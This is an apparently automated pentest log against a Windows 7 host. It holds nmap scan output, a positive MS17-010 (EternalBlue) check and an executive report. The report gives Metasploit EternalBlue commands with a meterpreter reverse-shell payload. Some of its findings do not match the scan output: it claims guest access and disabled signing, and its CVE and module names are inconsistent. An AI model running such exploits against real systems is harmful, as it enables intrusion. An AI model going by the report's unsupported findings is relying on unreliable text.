@@ -1,0 +1,249 @@
+PENTEST LOG — 10.129.10.24
+Date: 2026-06-04T21:20:23.630898
+============================================================
+
+[Step 1] Full TCP SYN scan (all 65535 ports)
+  Cmd: nmap -Pn -sS -p- --min-rate 1000 --max-retries 2 10.129.10.24
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:21 +0200
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 32.40 seconds
+
+----------------------------------------
+[Step 2] Version + OS detection on 135,139,445,49152,49153,49154,49155,49156,49157
+  Cmd: nmap -Pn -sV -O --version-intensity 5 -sC --script-timeout 60s -p 135,139,445,49152,49153,49154,49155,49156,49157 -oX /home/marina/Desktop/pentestM/RAG/outputs/nmap_sV_10_129_10_24.xml 10.129.10.24
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:22 +0200
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (98%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (97%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows 7 SP1 (95%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (95%), Microsoft Windows Windows 7 SP1 (95%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (95%), Microsoft Windows Vista SP1 (94%), Microsoft Windows Server 2012 (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-06-04T20:23:42+01:00
+| smb-security-mod
+----------------------------------------
+[Step 3] Check for EternalBlue vulnerability on SMB (port 445)
+  Cmd: nmap -Pn -sV --script smb-vuln-ms17-010 -p 445 10.129.10.24 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:25 +0200
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
+
+----------------------------------------
+[Step 4] Check SMBv1 Vulnerabilities on Port 139
+  Cmd: nmap -Pn -sV --script smb-vuln-ms17-010 -p 139 10.129.10.24 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:26 +0200
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.02 seconds
+
+----------------------------------------
+[Step 5] Enumerate SMB Services on Port 445
+  Cmd: nmap -Pn -sV --script smb-enum-shares,smb-enum-users -p 445 10.129.10.24 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:26 +0200
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds
+
+----------------------------------------
+[Step 6] ACK scan — firewall detection
+  Cmd: nmap -Pn -sA -p 135,139,445,49152,49153,49154,49155,49156,49157 10.129.10.24
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:28 +0200
+Nmap scan report for 10.129.10.24
+Host is up (0.037s latency).
+
+PORT      STATE      SERVICE
+135/tcp   unfiltered msrpc
+139/tcp   unfiltered netbios-ssn
+445/tcp   unfiltered microsoft-ds
+49152/tcp unfiltered unknown
+49153/tcp unfiltered unknown
+49154/tcp unfiltered unknown
+49155/tcp unfiltered unknown
+49156/tcp unfiltered unknown
+49157/tcp unfiltered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
+
+----------------------------------------
+[Step 7] UDP scan — top 100 ports by frequency
+  Cmd: nmap -Pn -sU --top-ports 100 --open --max-retries 1 10.129.10.24
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:28 +0200
+Warning: 10.129.10.24 giving up on port because retransmission cap hit (1).
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+Not shown: 95 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds
+
+----------------------------------------
+[Step 8] UDP scan — exploit-focused service ports
+  Cmd: nmap -Pn -sU -p 53,67,69,111,123,137,138,161,162,500,623,1434,1900,4500,5353,11211,17185 --open --max-retries 1 10.129.10.24
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 21:28 +0200
+Warning: 10.129.10.24 giving up on port because retransmission cap hit (1).
+Nmap scan report for 10.129.10.24
+Host is up (0.036s latency).
+Not shown: 12 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
+
+----------------------------------------
+[Step 9] MSF exploitation phase
+  Cmd: msfconsole (multiple modules)
+  OK: True
+  Out:
+16 modules executed
+----------------------------------------
+[Step 9] Searchsploit + credential phase
+  Cmd: searchsploit / paramiko / ftplib
+  OK: False
+  Out:
+3 exploits tried, 0 shells, 0 creds
+----------------------------------------
+
+============================================================
+EXECUTIVE REPORT:
+## Attack Surface Summary  
+The attack surface is **CRITICAL** due to the presence of known vulnerabilities and misconfigurations. The target is running an outdated and unsupported operating system (Windows 7 Professional SP1), which is inherently vulnerable. Additionally, SMBv1 is likely enabled, and the system is configured with SMB guest authentication and message signing disabled, both of which significantly increase the risk of exploitation.
+
+---
+
+## Detected Services and Versions  
+- **TCP 135**: Microsoft Windows RPC  
+- **TCP 139**: Microsoft Windows netbios-ssn  
+- **TCP 445**: Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
+- **TCP 49152–49157**: Microsoft Windows RPC  
+
+---
+
+## Key Findings  
+- The host is running **Windows 7 Professional SP1**, which is no longer supported and has known security risks.  
+- **SMBv1** is likely enabled, making it vulnerable to attacks like **EternalBlue**.  
+- **SMB guest authentication** is enabled, allowing unauthenticated access to shares.  
+- **SMB message signing** is disabled, increasing the risk of relay attacks.  
+- The system time reported by SMB does not match the time in the Nmap scan, which may indicate misconfiguration or clock skew.  
+- The **Remote Code Execution (RCE)** vulnerability in SMBv1 (CVE-2017-0144) is present.  
+
+---
+
+## Recommended Next Steps  
+1. **Patch or retire the system**: Windows 7 is no longer supported and poses a significant risk. Immediate action is required to either update to a supported OS or retire the system.  
+2. **Disable SMBv1**: Ensure SMBv1 is disabled to mitigate the risk of EternalBlue (CVE-2017-0144).  
+3. **Enable SMB message signing**: This will prevent relay attacks and improve security.  
+4. **Disable guest authentication**: Prevent unauthenticated access to shared resources.  
+5. **Verify system time synchronization**: Ensure the system clock is synchronized with a trusted NTP server.  
+6. **Exploit testing (for authorized testing only)**:  
+   - Use **Metasploit** to test for the **EternalBlue** vulnerability:  
+     ```bash
+     use exploit/windows/smb/ms17_010_eternalblue
+     set RHOSTS 10.129.10.24
+     set PAYLOAD windows/x64/meterpreter/reverse_tcp
+     exploit
+     ```
+   - Use **Metasploit** to test for the **SMBv1 RCE** vulnerability (CVE-2017-0144):  
+     ```bash
+     use exploit/windows/smb/ms17_010_smbexec
+     set RHOSTS 10.129.10.24
+     set PAYLOAD windows/x64/meterpreter/reverse_tcp
+     exploit
+     ```  
+7. **Audit firewall rules**: Ensure that only necessary ports (e.g., 135, 139, 445) are open and that access is restricted to trusted networks.  
+8. **Implement network segmentation**: Isolate the system from other parts of the network to limit potential damage from exploitation.
